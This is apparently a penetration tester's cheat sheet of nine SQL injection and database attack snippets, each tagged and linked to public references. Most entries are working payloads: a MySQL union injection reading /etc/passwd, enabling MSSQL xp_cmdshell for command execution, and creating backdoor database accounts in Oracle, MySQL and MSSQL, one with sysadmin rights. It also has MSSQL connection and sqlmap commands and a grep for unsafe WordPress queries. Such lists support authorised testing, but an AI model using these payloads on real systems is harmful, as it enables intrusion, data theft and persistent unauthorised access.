### 1. Load a file with MYSQL
```
null union all select load_file('/etc/passwd')/*
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheets
__________
### 2. enable xp_cmdshell
```
exec sp_configure 'xp_cmdshell', 1 go reconfigure
```
**- web application,sql injection,shell,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 3. oracle add user
```
create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;
```
**- web application,sql injection,Oracle**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
__________
### 4. mysql add user
```
insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))
```
**- web application,sql injection,mysql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
__________
### 5. mssql add user
```
exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'
```
**- web application,sql injection,mssql**
#### References:

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
__________
### 6. connect to mssql
```
tsql -S [IP] -U sa -P"[PASS]"
```
**- linux,mssql**
#### References:

https://linux.die.net/man/1/tsql
__________
### 7. connect to mssql
```
/opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
```
**- linux,mssql,impacket**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 8. SQLmap generic command
```
/opt/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o -r sql1.txt
```
**- sql injection**
#### References:

https://github.com/sqlmapproject/sqlmap/wiki/Usage
__________
### 9. Very Basic SQLI test in wp plugin
```
grep -ir wpdb . | egrep -i "get_r|insert|escape|query" | egrep "_GET|_POST|_REQUEST|\$" | grep --color wpdb.
```
**- web application,sql injection**
#### References:

https://codex.wordpress.org/Class_Reference/wpdb
__________
